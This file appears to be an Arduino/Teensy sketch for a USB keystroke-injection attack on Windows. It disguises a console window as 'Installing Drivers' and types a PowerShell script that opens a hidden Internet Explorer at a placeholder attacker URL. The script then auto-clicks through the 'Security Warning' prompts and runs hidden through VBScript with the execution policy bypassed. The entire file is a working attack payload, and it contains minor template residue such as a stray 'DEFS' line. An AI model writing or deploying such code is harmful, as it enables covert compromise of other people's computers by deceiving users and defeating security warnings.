#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  
  Keyboard.println("echo $ie = new-object -comobject \"InternetExplorer.Application\" > %temp%\\ap.ps1");
  Keyboard.println("echo $ie.visible = $false >> %temp%\\ap.ps1");
  Keyboard.println("echo $ie.navigate(\"INPUT0\") >> %temp%\\ap.ps1");
  Keyboard.println("echo sleep -seconds 20 >> %temp%\\ap.ps1");
  Keyboard.println("echo [void] [System.Reflection.Assembly]::LoadWithPartialName(\"Microsoft.VisualBasic\") >> %temp%\\ap.ps1");
  Keyboard.println("echo [Microsoft.VisualBasic.Interaction]::AppActivate(\"Warning - Security\") >> %temp%\\ap.ps1");
  Keyboard.println("echo [Microsoft.VisualBasic.Interaction]::AppActivate(\"Security Warning\") >> %temp%\\ap.ps1");
  Keyboard.println("echo sleep -seconds 2 >> %temp%\\ap.ps1");
  Keyboard.println("echo [void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\") >> %temp%\\ap.ps1");
  Keyboard.println("echo [System.Windows.Forms.SendKeys]::SendWait(\" \") >> %temp%\\ap.ps1");
  Keyboard.println("echo sleep -seconds 2 >> %temp%\\ap.ps1")
  Keyboard.println("echo [System.Windows.Forms.SendKeys]::SendWait(\"{TAB}\") >> %temp%\\ap.ps1");
  Keyboard.println("echo sleep -seconds 2 >> %temp%\\ap.ps1");
  Keyboard.println("echo [System.Windows.Forms.SendKeys]::SendWait(\"{Enter}\") >> %temp%\\ap.ps1");
   
  delay(2000);
  
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ap.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ap.ps1\"),0,true >> %temp%\\ap.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\ap.vbs");
  delay(3000);
  
  Keyboard.println("exit");

}

void loop(){
}

DEFS
